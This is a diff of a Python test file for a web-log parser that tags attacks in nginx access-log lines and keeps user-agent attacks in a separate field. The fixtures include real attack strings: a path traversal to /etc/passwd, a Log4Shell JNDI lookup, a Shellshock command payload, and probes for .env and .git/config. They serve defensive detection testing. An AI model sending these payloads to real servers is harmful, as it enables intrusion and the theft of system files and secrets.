@@ -165,33 +165,29 @@ def test_coverage_says_what_web_data_is_missing():
     assert web_gaps(snap(opted)) == []
 
 
+HEAD = "1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "
+
+
 @pytest.mark.parametrize(
-    ("line", "attacks"),
+    ("line", "field", "attacks"),
     [
+        (HEAD + '"GET /../../etc/passwd HTTP/1.1" 200 5 "-" "x"', "attacks", ["traversal"]),
+        (HEAD + '"GET / HTTP/1.1" 200 5 "-" "${jndi:ldap://e/a}"', "agent_attacks", ["jndi"]),
         (
-            '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /../../etc/passwd HTTP/1.1" 200 5'
-            ' "-" "x"',
-            ["traversal"],
-        ),
-        (
-            '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET / HTTP/1.1" 200 5 "-"'
-            ' "${jndi:ldap://e/a}"',
-            ["jndi"],
-        ),
-        (
-            '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /cgi HTTP/1.1" 404 5 "-"'
-            ' "() { :;}; /bin/id"',
+            HEAD + '"GET /cgi HTTP/1.1" 404 5 "-" "() { :;}; /bin/id"',
+            "agent_attacks",
             ["shellshock"],
         ),
-        ('1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /.env HTTP/1.1" 200 5 "-" "x"', []),
-        ('1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /.git/config HTTP/1.1" 200 5 "-" "x"', []),
+        (HEAD + '"GET /.env HTTP/1.1" 200 5 "-" "x"', "attacks", []),
+        (HEAD + '"GET /.git/config HTTP/1.1" 200 5 "-" "x"', "attacks", []),
     ],
 )
-def test_attacks_and_sensitive_files_are_kept(line, attacks):
+def test_attacks_and_sensitive_files_are_kept(line, field, attacks):
     builder = EventBuilder()
     builder.line(web_source(1, "/var/log/nginx/access.log"), line.encode() + b"\n")
     [event] = builder.events
-    assert event.fields.get("attacks", []) == attacks
+    # An attack in the user agent is kept apart: the request didn't carry it.
+    assert event.fields.get(field, []) == attacks
 
 
 def test_a_marker_in_the_user_agent_is_no_attack_and_not_kept():
